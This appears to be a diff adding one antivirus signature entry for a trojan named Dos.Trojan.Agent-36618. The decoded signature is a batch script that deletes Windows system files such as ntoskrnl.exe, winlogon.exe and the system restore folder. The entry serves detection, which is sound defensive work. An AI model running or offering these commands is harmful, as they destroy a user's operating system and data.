@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36618
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off del "c:\windows\pchealth\" del "c:\windows\system\" del "c:\windows\system32\restore\" del "winlogon.exe" del "c:\windows\system32\autoexec.nt" del "c:\windows\system32\logonui.exe" del "c:\windows\system32\ntoskrnl.exe" 
